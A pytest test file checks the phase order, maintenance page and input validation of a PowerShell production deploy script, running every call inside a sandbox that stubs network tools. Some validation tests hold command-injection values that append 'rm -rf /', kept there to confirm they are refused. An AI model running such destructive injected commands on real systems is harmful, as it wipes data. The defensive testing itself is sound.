"""deploy.ps1 and the production maintenance page.

The deploy script cannot be exercised against the real server from a test, and
it should not be: every remote step is a production mutation. What CAN be
tested is what decides whether a deploy is safe, in two layers:

* the remote bash each phase runs -- its ORDER, and what each phase is allowed
  to touch. ``deploy.ps1`` is written as functions that *render* that bash
  without running it, and this module renders them through ``pwsh``;
* the PowerShell around those scripts -- that a red phase stops with the page
  up and never reaches the next phase, and that the help it prints is right
  for the state it stopped in. That is driven by dot-sourcing the script and
  replacing the functions that touch the network with stubs.

Why the order is the thing under test: the maintenance page has to be up
before the backend is replaced (otherwise players see raw failures instead of
a notice), the backend has to answer ``/health`` before the new frontend goes
live (otherwise a new SPA talks to a dead API), and the lift has to be the
LAST thing that happens (otherwise "confirmed green" is a claim, not an
observation). A refactor that moves one line can invert any of these while
every step still "works".

Every pwsh this module starts runs behind ``SANDBOX`` (read it for the list:
the tools that reach the network or build are replaced by functions that
refuse and say so, and git passes through only its local reads), with proxies
pointed at a dead port and no ssh agent, against a COPY of the script in a
temporary directory -- so no ``.env`` sits next to the script under test. A
regression that sent the dry run, or a dot-source, into the real deploy fails
here instead of reaching production.

Requires ``pwsh`` (PowerShell 7.4+). CI's ubuntu runners ship it, and on CI a
missing pwsh FAILS rather than skips; locally the pwsh tests skip, the same
environmental gate ``tests/test_secure_pickle.py`` uses for the Unix-only
``resource`` module.
"""

import atexit
import collections
import html.parser
import itertools
import json
import os
import pathlib
import re
import shutil
import subprocess
import tempfile

import pytest

REPO_ROOT = pathlib.Path(__file__).resolve().parent.parent
DEPLOY_PS1 = REPO_ROOT / "deploy.ps1"
MAINTENANCE_HTML = REPO_ROOT / "frontend" / "public" / "maintenance.html"
#: The same page for a release that clears every cloud save (-SavesReset).
SAVES_RESET_HTML = REPO_ROOT / "frontend" / "public" / "maintenance-saves-reset.html"
APP_INDEX_HTML = REPO_ROOT / "frontend" / "index.html"
VITE_CONFIG = REPO_ROOT / "frontend" / "vite.config.js"
VERSION_FILE = REPO_ROOT / "VERSION"
CHANGELOG_MD = REPO_ROOT / "CHANGELOG.md"
CHANGELOG_JS = REPO_ROOT / "frontend" / "src" / "data" / "changelog.js"
RUNBOOK = REPO_ROOT / "docs" / "development" / "deployment.md"

PWSH = shutil.which("pwsh")
PWSH_TIMEOUT_SECONDS = 180

#: Recognisable, obviously fake commit ids, shaped like real ones so the
#: script's own validators accept them.
FAKE_SHA = "0123456789abcdef0123456789abcdef01234567"   # the commit being deployed
PREV_SHA = "fedcba9876543210fedcba9876543210fedcba98"   # the live frontend's
OTHER_SHA = "abcdefabcdefabcdefabcdefabcdefabcdefabcd"  # a third, for the edge cases
#: The main chunk "this run" built, as Get-LocalMainChunk would report it.
BUILT_CHUNK = "assets/index-Built123.js"
#: A -KeepMaintenance preview token, shaped like New-PreviewToken's.
PREVIEW_TOKEN = "0123456789abcdef0123456789abcdef"
PREVIEW_NAME = f"preview-{PREVIEW_TOKEN}.html"

#: Production facts, pinned BY VALUE on purpose: if one changes in the script,
#: test_the_layout_is_production_s fails and makes the reader look at both.
#: Names internal to the script (parked/saved index, page marker, commit file,
#: tarball paths) are read from its rendered $RemoteValues -- the ``layout``
#: fixture -- instead.
PRODUCTION_LAYOUT = {
    "LIVE": "/var/www/html/wp-content/HeartOfVirtue",
    "STAGING": "/var/www/html/wp-content/HeartOfVirtue.new",
    "PREVIOUS": "/var/www/html/wp-content/HeartOfVirtue.prev",
    "APP": "/home/alex/heart-of-virtue",
    "SERVICE": "heart-of-virtue",
    "HEALTH_URL": "http://127.0.0.1:5000/health",
    # Not "webserver": since 2026-09-17 the nginx container mounts the web root
    # read-only, and every write failed with "mounted volume is marked
    # read-only". The php-fpm container mounts the same volume writable.
    "CONTAINER": "wordpress",
    "PUBLIC_BASE": "https://nexusfidei.dev/games/HeartOfVirtue",
}
LIVE_DIR = PRODUCTION_LAYOUT["LIVE"]
STAGING_DIR = PRODUCTION_LAYOUT["STAGING"]
PREVIOUS_DIR = PRODUCTION_LAYOUT["PREVIOUS"]
SERVICE = PRODUCTION_LAYOUT["SERVICE"]
CONTAINER = PRODUCTION_LAYOUT["CONTAINER"]
HEALTH_URL = PRODUCTION_LAYOUT["HEALTH_URL"]
PUBLIC_BASE = PRODUCTION_LAYOUT["PUBLIC_BASE"]

#: What the recovery help prints, as the tests look for it.
RERUN = ".\\deploy.ps1\n"                       # the bare command on its own line
LIFT = ".\\deploy.ps1 -Maintenance Off"
RAISE = ".\\deploy.ps1 -Maintenance On"
STATUS_FIRST = "First (here), before anything else:\n    .\\deploy.ps1 -Status"
BACKEND_OK_GATE = "Go on only if it printed BACKEND_OK."
COMPLETE = "complete."
INTERRUPTED = "interrupted after it began changing production"
UNKNOWN_STATE = "not known here"
NOT_RAISED_HEADLINE = "players were not sent to it"
RAISED_HEADLINE = "The maintenance page is UP over the previous frontend"
PROMOTED_HEADLINE = "Behind it: a promoted build"
FOREIGN_HEADLINE = "is NOT the one this run built"
FRONTEND_ROLLBACK = f"test -d {PREVIOUS_DIR} && rm -rf {LIVE_DIR} && mv {PREVIOUS_DIR} {LIVE_DIR}"
#: ssh's own exit status on a lost connection; no remote script exits with it.
SSH_CONNECTION_LOST = 255


def _rollback_line(sha):
    return f"git reset --hard {sha} && .venv/bin/pip install"


# ── the sandbox every pwsh runs in ───────────────────────────────────────────

#: Prepended to every pwsh command. Functions win over applications and
#: cmdlets in PowerShell's command lookup, so these shadow the real tools for
#: every call the script makes by name (including `& $Exe`). The ways around a
#: function shim -- an absolute path, Start-Process, .NET, a new runspace -- are
#: refused by TestTheScriptText.test_nothing_reaches_a_tool_around_the_sandbox.
#: Each stub reports on stderr as well as the host, so redirecting the host
#: stream away cannot hide a call.
SANDBOX = r"""
$global:HovRealGit = (Get-Command git -CommandType Application | Select-Object -First 1).Source
$stubbed = 'ssh', 'scp', 'sshpass', 'npm', 'docker', 'tar', 'curl', 'Invoke-WebRequest', 'Invoke-RestMethod',
    'ssh.exe', 'scp.exe', 'curl.exe', 'tar.exe', 'npm.cmd', 'git.exe'
foreach ($tool in $stubbed) {
    Set-Item -Path "function:global:$tool" -Value {
        $message = "STUB-CALLED $($MyInvocation.MyCommand.Name) $args"
        [Console]::Error.WriteLine($message)
        Write-Host $message
        $global:LASTEXITCODE = 97
    }
}
function global:git {
    # Local reads pass through, without optional locks; everything else --
    # fetch, pull, push, every write, any option this parser does not know --
    # is refused. Fail closed: only `-C <path>` may precede the subcommand.
    $i = 0
    while ($i -lt $args.Count -and $args[$i] -ceq '-C') { $i += 2 }
    if ($i -lt $args.Count -and $args[$i] -cin 'rev-parse', 'status', 'ls-files', 'rev-list', 'log') {
        & $global:HovRealGit --no-optional-locks @args
        return
    }
    $message = "STUB-CALLED git $args"
    [Console]::Error.WriteLine($message)
    Write-Host $message
    $global:LASTEXITCODE = 97
}
"""


def _ps_literal(value):
    """``value`` as a single-quoted PowerShell string literal."""
    return "'" + str(value).replace("'", "''") + "'"


def _ps_lines(lines):
    return "@(" + ", ".join(_ps_literal(line) for line in lines) + ")"


def _ps_bool(value):
    return "$true" if value else "$false"


def _git_dir():
    proc = subprocess.run(
        ["git", "rev-parse", "--absolute-git-dir"], cwd=REPO_ROOT,
        capture_output=True, text=True, stdin=subprocess.DEVNULL, timeout=30,
    )
    return proc.stdout.strip() if proc.returncode == 0 else ""


#: The repository's git dir, so a copy of the script elsewhere can still read HEAD.
GIT_DIR = _git_dir()

#: A copy of the script (with VERSION and the page) in a directory with no
#: .env and no build: what every dot-source and run below uses.
SCRIPT_COPY_DIR = pathlib.Path(tempfile.mkdtemp(prefix="hov-deploy-"))
atexit.register(shutil.rmtree, SCRIPT_COPY_DIR, ignore_errors=True)
shutil.copy(DEPLOY_PS1, SCRIPT_COPY_DIR / "deploy.ps1")
shutil.copy(VERSION_FILE, SCRIPT_COPY_DIR / "VERSION")
(SCRIPT_COPY_DIR / "frontend" / "public").mkdir(parents=True)
shutil.copy(MAINTENANCE_HTML, SCRIPT_COPY_DIR / "frontend" / "public" / "maintenance.html")
shutil.copy(SAVES_RESET_HTML, SCRIPT_COPY_DIR / "frontend" / "public" / "maintenance-saves-reset.html")
SCRIPT_COPY = SCRIPT_COPY_DIR / "deploy.ps1"


def _dot_source(script):
    return f". {_ps_literal(script.as_posix())}\n"


DOT_SOURCE = _dot_source(SCRIPT_COPY)


def _script_copy_with_line_endings(eol):
    """A copy of the script beside SCRIPT_COPY (so it finds VERSION) with every
    line ending in ``eol``, whatever this checkout's own endings are."""
    path = SCRIPT_COPY_DIR / f"deploy-{eol.hex()}.ps1"
    path.write_bytes(DEPLOY_PS1.read_bytes().replace(b"\r\n", b"\n").replace(b"\n", eol))
    return path


#: Environment names a child pwsh must not inherit: git's (a hook or `bisect
#: run` exports ones that point at the developer's repository), the deploy
#: gate's own (VITE_*, NODE_*), and anything that could authenticate ssh.
_DROPPED_ENV = re.compile(r"GIT_.*|VITE_.*|NODE_ENV|NODE_OPTIONS|SSH_AUTH_SOCK|SSH_AGENT_PID|SSHPASS", re.I)
_DEAD_PROXY = "http://127.0.0.1:9"


def _sandbox_env(extra=None):
    env = {name: value for name, value in os.environ.items() if not _DROPPED_ENV.fullmatch(name)}
    for name in ("HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy"):
        env[name] = _DEAD_PROXY
    env["NO_PROXY"] = env["no_proxy"] = ""
    env["GIT_TERMINAL_PROMPT"] = "0"
    env.update(extra or {})
    return env


def _pwsh(script, *, env=None, check=False):
    """Run ``script`` under the sandbox; fails the test if a stub was reached,
    and (``check``) unless pwsh exited 0."""
    proc = subprocess.run(
        [PWSH, "-NoProfile", "-NonInteractive", "-Command", SANDBOX + script],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        cwd=str(SCRIPT_COPY_DIR),
        timeout=PWSH_TIMEOUT_SECONDS,
        stdin=subprocess.DEVNULL,
        env=_sandbox_env(env),
    )
    output = proc.stdout + proc.stderr
    assert "STUB-CALLED" not in output, (
        "the script reached a tool the sandbox replaces -- outside the sandbox "
        f"that would have been a real network or build call:\n{output}"
    )
    if check:
        assert proc.returncode == 0, f"pwsh exited {proc.returncode}:\n{output}"
    return proc


def _assert_in_order(text, *needles, label=""):
    """Each needle is present, and each first occurrence follows the last."""
    where = f"[{label}] " if label else ""
    positions = []
    for needle in needles:
        position = text.find(needle)
        assert position >= 0, f"{where}{needle!r} not found in:\n{text}"
        positions.append(position)
    for (earlier, first), (later, second) in itertools.pairwise(zip(needles, positions)):
        assert first < second, f"{where}{later!r} must come after {earlier!r}:\n{text}"


@pytest.fixture(scope="module")
def pwsh():
    """The pwsh binary. Skips locally without it; on CI a missing pwsh would
    retire every test below silently, so there it is a failure."""
    if PWSH:
        return PWSH
    if os.environ.get("CI"):
        pytest.fail("pwsh is not on PATH in CI; tests/test_deploy_script.py cannot run")
    pytest.skip("pwsh (PowerShell 7) is not installed; CI's ubuntu runners ship it")


#: How each phase is rendered; every all-phase guard iterates these.
PHASE_RENDERERS = {
    "stage": f"New-StageScript -Sha '{FAKE_SHA}'",
    "swap": f"New-SwapAndLiftScript -Chunk '{BUILT_CHUNK}'",
    "kept": f"New-SwapAndLiftScript -Chunk '{BUILT_CHUNK}' -PreviewToken '{PREVIEW_TOKEN}'",
    "status": "New-StatusScript",
    "on": "New-MaintenanceOnScript",
    "off": "New-MaintenanceOffScript",
}
PHASES = tuple(PHASE_RENDERERS)
#: Phases that must NOT stop at the first failure; every other one must.
NON_STOPPING_PHASES = {"status"}


def _render_all(script):
    """Every remote script the deploy can run, rendered by dot-sourcing
    ``script``, as strings, plus its $RemoteValues (``layout``) and default
    $Version."""
    renders = "".join(f"    {name} = {call}\n" for name, call in PHASE_RENDERERS.items())
    proc = _pwsh(
        _dot_source(script)
        + "[ordered]@{\n    layout = $RemoteValues\n    version = $Version\n"
        + renders
        + "} | ConvertTo-Json -Depth 3\n",
        check=True,
    )
    assert proc.stdout.strip(), f"pwsh rendered nothing; stderr:\n{proc.stderr}"
    return json.loads(proc.stdout)


@pytest.fixture(scope="module")
def rendered(pwsh):
    """``_render_all`` of this checkout's script, once."""
    return _render_all(SCRIPT_COPY)


@pytest.fixture(scope="module")
def layout(rendered):
    """$RemoteValues as rendered: the script's own internal names (PARKED,
    SAVED, MARKER, COMMIT_FILE, ...)."""
    return rendered["layout"]


@pytest.fixture(scope="module")
def script_text():
    return DEPLOY_PS1.read_text(encoding="utf-8")


def _markers_the_script_reads(text, prefix="HOV_"):
    return set(re.findall(rf"-Name '({re.escape(prefix)}[A-Z_]+)'", text))


# ── the rendering itself ─────────────────────────────────────────────────────


def test_the_layout_is_production_s(layout):
    for key, value in PRODUCTION_LAYOUT.items():
        assert layout[key] == value, f"$RemoteValues.{key} is {layout[key]!r}, not {value!r}"


def test_every_phase_is_fully_expanded_lf_only_bash(rendered):
    for phase in PHASES:
        script = rendered[phase]
        # Whatever this checkout's line endings are;
        # test_the_rendering_does_not_depend_on_the_script_s_line_endings
        # renders both explicitly.
        assert "\r" not in script, f"{phase} script contains a carriage return"
        assert re.search(r"__[A-Z0-9_]+__", script) is None, f"unexpanded placeholder in {phase}"


def test_the_rendering_does_not_depend_on_the_script_s_line_endings(pwsh):
    # pwsh does NOT normalise a here-string's line endings, and a Windows
    # checkout with core.autocrlf=true has this script in CRLF; what a `\r`
    # does on the server is in Expand-Template's docstring. CI checks out LF,
    # so this renders both endings rather than trusting the checkout.
    lf, crlf = (_render_all(_script_copy_with_line_endings(eol)) for eol in (b"\n", b"\r\n"))
    for phase in PHASES:
        assert "\r" not in crlf[phase], f"{phase} rendered from a CRLF script carries a carriage return"
        assert crlf[phase] == lf[phase], phase


def _render_outcomes(call, cases):
    """Run ``call`` (PowerShell taking $case) per case; 'rendered'/'refused'."""
    body = "\n".join(
        f"$case = {case}\ntry {{ {call} | Out-Null; 'RESULT:rendered' }} catch {{ 'RESULT:refused' }}"
        for case in cases
    )
    proc = _pwsh(DOT_SOURCE + body + "\n", check=True)
    return re.findall(r"RESULT:(\w+)", proc.stdout)


def test_expand_template_refuses_unsafe_values(pwsh):
    # `rm -rf __STAGING__` with an empty value is `rm -rf `; with a relative
    # one it is whatever the remote cwd makes it; a quote breaks out of the
    # `sh -c '...'` the value is spliced into.
    cases = {
        "@{}": "rendered",                               # control: the real values
        "@{ LIVE = '' }": "refused",
        "@{ SERVICE = '   ' }": "refused",               # not a path: only the emptiness check
        "@{ LIVE = $null }": "refused",
        "@{ PREVIOUS = 'relative/dir' }": "refused",
        "@{ SERVICE = \"x'; rm -rf / #\" }": "refused",
        "@{ LIVE = '/var/www/../etc' }": "refused",
        "@{ LIVE = \"/var/www/x`n\" }": "refused",       # .NET's $ matches before a final newline
        "@{ SERVICE = \"x`r\" }": "refused",              # not a path: bash reads `\r` as part of the word
        "@{ SERVICE = \"x`n\" }": "refused",              # not a path: a newline splits the command it lands in
        "@{ LIVE = '//var/www' }": "refused",
        "@{ LIVE = '/var/www/' }": "refused",            # a trailing slash nests .new inside live
    }
    outcomes = _render_outcomes(
        "Expand-Template -Template 'rm -rf __LIVE__ __STAGING__ __PREVIOUS__ && systemctl restart __SERVICE__' -Values $case",
        cases,
    )
    assert dict(zip(cases, outcomes)) == cases


def test_a_control_character_is_refused_by_the_key_that_carries_it(pwsh):
    # Every value is checked, so the operator is told which one, not left to
    # bisect a rendered script.
    proc = _pwsh(
        DOT_SOURCE
        + "try { Expand-Template -Template 'systemctl restart __SERVICE__' -Values @{ SERVICE = \"x`ny\" } | Out-Null; 'RESULT:rendered' }"
        + " catch { \"RESULT:$($_.Exception.Message)\" }\n",
        check=True,
    )
    assert "RESULT:Remote script value SERVICE " in proc.stdout, proc.stdout


def test_a_lone_carriage_return_in_a_template_is_refused(pwsh):
    # Only CRLF line endings are normalised. Any other `\r` in a template is
    # not a line ending, and would reach bash inside a word; the values are
    # checked separately, so this is the only guard on the template itself.
    assert _render_outcomes("Expand-Template -Template \"echo __SERVICE__`rdone\" -Values $case", ["@{}"]) == ["refused"]


def test_the_sha_reaching_git_reset_is_validated(pwsh):
    cases = {
        f"'{FAKE_SHA}'": "rendered",
        "'x; rm -rf /'": "refused",
        f"\"{FAKE_SHA}`n\"": "refused",
        f"'{FAKE_SHA.upper()}'": "refused",
        f"'{FAKE_SHA[:-1]}'": "refused",
        "''": "refused",
    }
    outcomes = _render_outcomes("New-StageScript -Sha $case", cases)
    assert dict(zip(cases, outcomes)) == cases


def test_the_chunk_reaching_the_swap_is_validated(pwsh):
    cases = {
        "'assets/index-ok_1.js'": "rendered",
        "'assets/index-x.js; rm -rf /'": "refused",
        "\"assets/index-x.js`n\"": "refused",
        "''": "refused",
    }
    outcomes = _render_outcomes("New-SwapAndLiftScript -Chunk $case", cases)
    assert dict(zip(cases, outcomes)) == cases


def test_the_mutating_phases_stop_at_the_first_failure(rendered):
    # `set -e` is what stops the lift from running after a failed check, and
    # `pipefail` what stops a failed `docker exec` hiding behind a pipe.
    for phase in PHASES:
        if phase in NON_STOPPING_PHASES:
            continue
        assert rendered[phase].startswith("set -euo pipefail\n"), phase
    # The report is the one that must NOT stop: every probe should print.
    status = rendered["status"]
    assert "\nset -uo pipefail\n" in status
    assert re.search(r"^\s*set\s+(-\w*e|-o\s+errexit)", status, re.M) is None


def test_the_markers_that_steer_the_deploy_are_printed_exactly_once(rendered):
    # Get-Marker merges repeats of one value, so a second, earlier echo of a
    # marker would pass unnoticed and could claim a step that has not happened.
    once = {
        "stage": ['echo "HOV_MAINTENANCE=ON"', 'echo "HOV_MAINTENANCE=NO_LIVE_INDEX"', 'echo "HOV_BACKEND_HEALTH=OK"'],
        "swap": ['echo "HOV_PROMOTED=yes"', 'echo "HOV_ASSET_SERVED=OK"', 'echo "HOV_MAINTENANCE=OFF"'],
        "kept": ['echo "HOV_PROMOTED=yes"', 'echo "HOV_ASSET_SERVED=OK"', 'echo "HOV_MAINTENANCE=KEPT"', 'echo "HOV_PREVIEW='],
    }
    for phase, markers in once.items():
        for marker in markers:
            assert rendered[phase].count(marker) == 1, f"{phase}: {marker} appears {rendered[phase].count(marker)} times"


# ── ssh #1: stage, raise, replace ────────────────────────────────────────────

#: Lines that may name the live directory before the page goes up: reads only.
READS_OF_LIVE_BEFORE_THE_RAISE = (
    r"parked=\$\(docker exec \S+ sh -c 'if \[ ! -e LIVE/[\w.-]+ \]; then echo no; elif ls LIVE/preview-\*\.html >/dev/null 2>&1; "
    r"then echo kept; else echo yes; fi'\)",
    r'  echo "HOV_ERROR=LIVE/[\w.-]+ exists: [^"]*"',
    r"if docker exec \S+ awk -v p=LIVE '[^']*' /proc/self/mountinfo; then",
    r"live_commit=\$\(docker exec \S+ sh -c 'cat LIVE/[\w.-]+ 2>/dev/null \|\| echo NONE'\)",
    r"page_was_up=\$\(docker exec \S+ sh -c 'if \[ -f LIVE/[\w.-]+ \] \|\| grep -q [\w-]+ LIVE/index\.html 2>/dev/null; then echo yes; else echo no; fi'\)",
)


class TestTheStagePhase:
    """ssh call #1: stage the build, raise maintenance, replace the backend."""

    def test_nothing_players_see_changes_until_the_page_is_up(self, rendered, layout):
        stage = rendered["stage"]
        raise_line = f"cp {STAGING_DIR}/maintenance.html index.html"
        _assert_in_order(
            stage,
            f"[ ! -e {LIVE_DIR}/{layout['PARKED']} ]",
            "HOV_REFUSED=KEPT_FOR_PREVIEW",
            "HOV_REFUSED=UNLIFTED_PROMOTE",
            "HOV_REFUSED=LIVE_IS_MOUNTPOINT",
            "HOV_REFUSED=HOST_CANNOT_REACH_PUBLIC",
            'echo "HOV_LIVE_COMMIT=$live_commit"',
            'echo "HOV_PAGE_WAS_UP=$page_was_up"',
            'echo "HOV_PREV_SHA=$prev_sha"',
            "git fetch --quiet origin master",
            f'git cat-file -e "{FAKE_SHA}^{{commit}}"',
            f"tar -xf {layout['CONTAINER_TAR']} -C {STAGING_DIR} ",
            raise_line,
            f"git reset -q --hard {FAKE_SHA}",
            "pip install",
            f"sudo systemctl restart {SERVICE}",
            f"systemctl is-active --quiet {SERVICE}",
            HEALTH_URL,
        )
        # An allow-list of how the live directory may be named before the
        # raise: any new command touching it, spelled any way, is a line this
        # list does not know.
        before = stage[:stage.rfind("\n", 0, stage.index(raise_line))].splitlines()
        live = re.compile(re.escape(LIVE_DIR) + r"(?![.\w])")
        for line in before:
            if not live.search(line):
                continue
            shape = live.sub("LIVE", line)
            assert any(re.fullmatch(allowed, shape) for allowed in READS_OF_LIVE_BEFORE_THE_RAISE), (
                f"touches the live directory before the page is up: {line}"
            )

    def test_the_live_index_is_saved_before_the_page_replaces_it(self, rendered, layout):
        saved, marker = layout["SAVED"], layout["MARKER"]
        guarded_save = f"{{ [ -f {saved} ] || grep -q {marker} index.html || cp index.html {saved}; }}"
        for phase, page in (("stage", f"{STAGING_DIR}/maintenance.html"), ("on", f"{LIVE_DIR}/maintenance.html")):
            # Saved only if nothing is saved yet AND the index is not already
            # the page; the copy runs only if the save did (`&&`).
            assert f"cd {LIVE_DIR} && {guarded_save} && cp {page} index.html" in rendered[phase], phase

    def test_the_raise_marker_is_printed_by_the_branch_that_raised(self, rendered):
        assert (
            f'cp {STAGING_DIR}/maintenance.html index.html && echo "HOV_MAINTENANCE=ON"; '
            'else echo "HOV_MAINTENANCE=NO_LIVE_INDEX"; fi'
        ) in rendered["stage"]

    def test_the_build_is_extracted_into_staging_and_stamped_with_its_commit(self, rendered, layout):
        # Every tar invocation in every phase, however it is spelled or
        # qualified: exactly one, and it is this.
        tar = re.compile(r"(?<![\w.~-])(?:/\S*/)?tar\s[^&;|']*")
        invocations = [(phase, m.group(0).strip()) for phase in PHASES for m in tar.finditer(rendered[phase])]
        container_tar = layout["CONTAINER_TAR"]
        assert invocations == [("stage", f"tar -xf {container_tar} -C {STAGING_DIR}")]
        assert (
            f"rm -rf {STAGING_DIR} && mkdir -p {STAGING_DIR} && tar -xf {container_tar} -C {STAGING_DIR} && "
            f"rm -f {container_tar} && chmod -R u=rwX,go=rX {STAGING_DIR} && echo {FAKE_SHA} > {STAGING_DIR}/{layout['COMMIT_FILE']}"
        ) in rendered["stage"]

    def test_the_backend_is_pinned_to_the_built_commit_not_pulled(self, rendered, layout):
        assert f"cd {layout['APP']}\ngit reset -q --hard {FAKE_SHA}\n" in rendered["stage"]
        for phase in PHASES:
            assert "git pull" not in rendered[phase], phase

    def test_the_backend_health_decides_the_stage(self, rendered, layout):
        stage = rendered["stage"]
        assert f'systemctl is-active --quiet {SERVICE} || {{ echo "HOV_BACKEND_HEALTH=INACTIVE"; exit 1; }}' in stage
        assert f"if curl -fsS --max-time {layout['HEALTH_TIMEOUT']} {HEALTH_URL} >/dev/null; then" in stage
        assert stage.rstrip("\n").endswith('echo "HOV_BACKEND_HEALTH=FAIL"\nexit 1'), stage[-200:]

    def test_it_refuses_before_anything_changes(self, rendered, layout):
        stage = rendered["stage"]
        # Fail closed: a docker failure aborts (set -e) rather than reading as "not parked".
        parked = (
            f"parked=$(docker exec {CONTAINER} sh -c 'if [ ! -e {LIVE_DIR}/{layout['PARKED']} ]; then echo no; "
            f"elif ls {LIVE_DIR}/{layout['PREVIEW_GLOB']} >/dev/null 2>&1; then echo kept; else echo yes; fi')\n"
        )
        _assert_in_order(
            stage,
            parked,
            'if [ "$parked" = kept ]; then\n  echo "HOV_REFUSED=KEPT_FOR_PREVIEW"\n',
            'if [ "$parked" != no ]; then\n  echo "HOV_REFUSED=UNLIFTED_PROMOTE"\n',
            'echo "HOV_REFUSED=LIVE_IS_MOUNTPOINT"\n  exit 1\n',
            'echo "HOV_REFUSED=HOST_CANNOT_REACH_PUBLIC"\n  exit 1\n',
            "docker cp ",
            "rm -rf ",
            "git reset",
        )
        assert f"curl -sS -o /dev/null --proto =https --max-time {layout['SERVER_PUBLIC_TIMEOUT']} {PUBLIC_BASE}/; then" in stage

    def test_the_stage_parks_the_new_index_and_never_promotes_or_lifts(self, rendered, layout):
        stage, parked = rendered["stage"], layout["PARKED"]
        # The staged build fronts itself with the page too, so the directory
        # swap cannot lift maintenance by accident.
        _assert_in_order(
            stage,
            f"mv {STAGING_DIR}/index.html {STAGING_DIR}/{parked}",
            f"cp {STAGING_DIR}/maintenance.html {STAGING_DIR}/index.html",
        )
        assert f"mv {STAGING_DIR} {LIVE_DIR}" not in stage
        assert f"mv {LIVE_DIR}/{parked} {LIVE_DIR}/index.html" not in stage

    def test_the_upload_is_removed_once_it_is_in_the_container(self, rendered, layout):
        remote_tar = layout["REMOTE_TAR"]
        _assert_in_order(
            rendered["stage"],
            f"docker cp {remote_tar} {CONTAINER}:{layout['CONTAINER_TAR']}\n",
            f"rm -f {remote_tar}\n",
        )


# ── ssh #2: promote, prove, lift ─────────────────────────────────────────────


class TestTheSwapAndLiftPhase:
    """ssh call #2: promote the staged build, verify it is served, then lift."""

    def test_only_this_run_s_build_is_promoted_and_the_renames_are_chained(self, rendered, layout):
        # The staged build must name this run's chunk before anything moves.
        # `mv live prev; mv new live` has the exit status of the LAST command:
        # a first rename that failed would let the second move the staged
        # build INTO the live directory and report success; a failed second
        # rename is undone.
        pattern, parked = layout["CHUNK_PATTERN"], layout["PARKED"]
        assert (
            f"""sh -c '[ "$(grep -oE "{pattern}" {STAGING_DIR}/{parked} | head -n 1)" = {BUILT_CHUNK} ] """
            f"""|| {{ echo "HOV_NEW_CHUNK=MISMATCH (staged)"; exit 1; }}; """
            f"rm -rf {PREVIOUS_DIR} && {{ [ ! -d {LIVE_DIR} ] || mv {LIVE_DIR} {PREVIOUS_DIR}; }} && "
            f"{{ mv {STAGING_DIR} {LIVE_DIR} || {{ [ ! -d {PREVIOUS_DIR} ] || mv {PREVIOUS_DIR} {LIVE_DIR}; exit 1; }}; }}'"
        ) in rendered["swap"]

    def test_promoted_is_reported_immediately_after_the_promote(self, rendered):
        lines = rendered["swap"].splitlines()
        promote = next((i for i, line in enumerate(lines) if f"mv {STAGING_DIR} {LIVE_DIR}" in line), None)
        assert promote is not None and promote + 1 < len(lines), "no promote line in the swap, or nothing after it"
        assert lines[promote + 1] == 'echo "HOV_PROMOTED=yes"'

    def test_the_previous_build_gets_its_real_index_back(self, rendered, layout):
        saved = layout["SAVED"]
        assert f"mv {PREVIOUS_DIR}/{saved} {PREVIOUS_DIR}/index.html" in rendered["swap"]

    def test_the_promoted_build_is_checked_again_before_anything_is_served(self, rendered, layout):
        # The race between the check and the promote.
        _assert_in_order(
            rendered["swap"],
            f'grep -oE "{layout["CHUNK_PATTERN"]}" {LIVE_DIR}/{layout["PARKED"]}',
            f'if [ "$chunk" != "{BUILT_CHUNK}" ]; then echo "HOV_NEW_CHUNK=MISMATCH (promoted: ${{chunk:-NONE}})"; exit 1; fi',
            "curl -fsSL",
        )

    def test_the_served_check_cannot_be_satisfied_by_the_spa_fallback(self, rendered, layout):
        # The web server answers a missing asset with index.html and 200, so
        # the status alone proves nothing; the content type does. HTTPS only,
        # redirects included.
        swap = rendered["swap"]
        assert (
            "if ! content_type=$(curl -fsSL --proto =https --proto-redir =https "
            f"--max-redirs {layout['REDIRECT_LIMIT']} --max-time {layout['SERVER_PUBLIC_TIMEOUT']} "
            "-o /dev/null -w '%{content_type}' "
            f"\"{PUBLIC_BASE}/{BUILT_CHUNK}\" | tr -d '\\r\\n'); then\n"
            '  echo "HOV_ASSET_SERVED=HTTP_ERROR"\n  exit 1\n'
        ) in swap
        assert '  *javascript*) echo "HOV_ASSET_SERVED=OK" ;;\n' in swap
        assert re.search(r'\n  \*\) echo "HOV_ASSET_SERVED=WRONG_TYPE[^\n]*; exit 1 ;;\n', swap)

    def test_the_lift_is_last_and_only_its_marker_follows(self, rendered, layout):
        swap = rendered["swap"]
        lift = f"docker exec {CONTAINER} sh -c 'mv {LIVE_DIR}/{layout['PARKED']} {LIVE_DIR}/index.html'"
        _assert_in_order(swap, f"mv {STAGING_DIR} {LIVE_DIR}", "curl -fsSL", 'echo "HOV_ASSET_SERVED=OK"', lift)
        lines = swap.splitlines()
        # The whole line, so nothing can ride along after the rename.
        index = lines.index(lift)
        after_lift = [line for line in lines[index + 1:] if line.strip()]
        assert after_lift == ['echo "HOV_MAINTENANCE=OFF"'], f"runs after the lift: {after_lift}"


#: Where the two ssh #2 variants part: everything before it is the same text.
STEP_3 = "\n# 3. "


class TestTheKeptSwap:
    """ssh call #2 under -KeepMaintenance: promote and prove exactly as the
    default does, then leave the page up and place a private preview."""

    def test_it_is_the_default_swap_up_to_step_3(self, rendered):
        # So every promote-and-prove test above holds for the kept variant
        # too, and the default's tail is the lift and nothing else.
        swap, kept = rendered["swap"], rendered["kept"]
        assert STEP_3 in swap and STEP_3 in kept
        assert kept[:kept.index(STEP_3)] == swap[:swap.index(STEP_3)]
        assert swap[swap.index(STEP_3):].count("docker exec") == 1
        assert 'echo "HOV_MAINTENANCE=OFF"' in swap and "HOV_MAINTENANCE=KEPT" not in swap
        assert "HOV_PREVIEW" not in swap and "preview-" not in swap

    def test_it_never_puts_the_real_index_in_front(self, rendered, layout):
        kept, parked = rendered["kept"], layout["PARKED"]
        assert "HOV_MAINTENANCE=OFF" not in kept
        # Nothing moves or removes the parked index, and nothing writes the
        # live directory's index.html (PREVIOUS's is the previous build's).
        assert re.search(r"\b(mv|rm)\b[^\n;&|]*" + re.escape(f"{LIVE_DIR}/{parked}"), kept) is None, kept
        assert re.search(re.escape(LIVE_DIR) + r"/index\.html(?![.\w])", kept) is None, kept

    def test_the_preview_is_copied_after_the_asset_proof_and_is_the_last_change(self, rendered, layout):
        kept = rendered["kept"]
        copy = f"docker exec {CONTAINER} sh -c 'cp {LIVE_DIR}/{layout['PARKED']} {LIVE_DIR}/{PREVIEW_NAME}'"
